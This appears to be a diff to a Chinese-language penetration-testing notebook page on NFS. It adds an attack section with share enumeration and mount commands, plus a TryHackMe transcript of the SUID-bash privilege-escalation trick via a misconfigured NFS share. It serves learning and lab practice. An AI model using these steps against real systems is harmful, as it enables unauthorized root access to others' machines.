@@ -6,11 +6,13 @@ description: 关于 NFS 的相关介绍
 
 ## 简介
 
-NFS 是 Network File System 缩写及网络文件系统。NFS主要功能是通过局域网络让不同的主机系统之间可以共享文件或目录。
 
-NFS系统和Windows网络共享、网络驱动器类似, 只不过windows 网络共享用于局域网, NFS用于企业集群架构中, 如果是大型网站, 会用到更复杂的分布式文件系统FastDFS,glusterfs,HDFS,ceph
 
-NFS 协议没有**身份验证和授权机制**。授权取自配置文件系统的可用信息，服务器负责将客户端提供的用户信息翻译成文件系统的用户信息，并尽可能正确的将相应的授权信息转换成 UNIX 要求的语法
+* NFS 具有和 SMB 相同的用途，目的是通过网络访问文件系统，但是两者使用不同的协议
+* 我们可以通过 NFS 将远程目录挂载在本地系统上，就和插了一个 U 盘一样
+* 配置文件： /etc/exports
+* NFS系统和Windows网络共享、网络驱动器类似, 只不过windows 网络共享用于局域网, NFS用于企业集群架构中, 如果是大型网站, 会用到更复杂的分布式文件系统FastDFS,glusterfs,HDFS,ceph
+* NFS 协议没有**身份验证和授权机制**。授权取自配置文件系统的可用信息，服务器负责将客户端提供的用户信息翻译成文件系统的用户信息，并尽可能正确的将相应的授权信息转换成 UNIX 要求的语法
 
 | 版本    | 特征                                                                     |
 | ----- | ---------------------------------------------------------------------- |
@@ -36,6 +38,59 @@ NFS 协议没有**身份验证和授权机制**。授权取自配置文件系统
 <figure><img src="../../.gitbook/assets/NFS2.webp" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/NFS3.webp" alt=""><figcaption></figcaption></figure>
+
+## 攻击
+
+### 1. 显示可用的 NFS 共享
+
+```bash
+$ showmount -e 10.129.14.128
+```
+
+### 2. 挂载&卸载
+
+```bash
+# 挂载 NFS 共享
+$ mkdir target-NFS
+$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
+	# -t nfs  挂载的设备类型
+$ cd target-NFS
+$ tree .
+
+# 卸载
+$ cd ..
+$ umount ./target-NFS
+```
+
+### 3. 攻击思路--利用 SUID
+
+```bash
+1. NFS 访问
+2. 将 Bash 可执行文件上传到 NFS 共享
+3. 利用 NFS 配置错误，设置 BASH  SUID 权限
+4. 利用获得的 SHELL 去执行 SUID Bash 程序实现权限提升
+
+┌──(jtz㉿JTZ)-[~/Desktop/Temp/TryHackMe]
+└─$ sudo mount -t nfs 10.10.236.239:/home ./NFS/ -o nolock[sudo] password for jtz:
+
+┌──(jtz㉿JTZ)-[~/Desktop/Temp/TryHackMe]
+└─$ cd NFS
+┌──(root㉿JTZ)-[/home/jtz/Desktop/Temp/TryHackMe/NFS]
+└─# cp ../bash .
+┌──(root㉿JTZ)-[/home/jtz/Desktop/Temp/TryHackMe/NFS]
+└─# chmod +s bash
+
+┌──(root㉿JTZ)-[/home/jtz/Desktop/Temp/TryHackMe/NFS]
+└─# ls -al
+total 1248
+drwxr-xr-x 3 root root    4096 Feb  2 11:53 .
+drwxr-xr-x 7 jtz  jtz     4096 Feb  2 11:52 ..
+-rwsr-sr-x 1 root root 1265648 Feb  2 11:53 bash
+drwxr-xr-x 5 jtz  jtz     4096 Jun  4  2020 cappucino
+
+# 在获取的 SHELL 上执行
+$ ./bash -p
+```
 
 ## NFS 实践
 
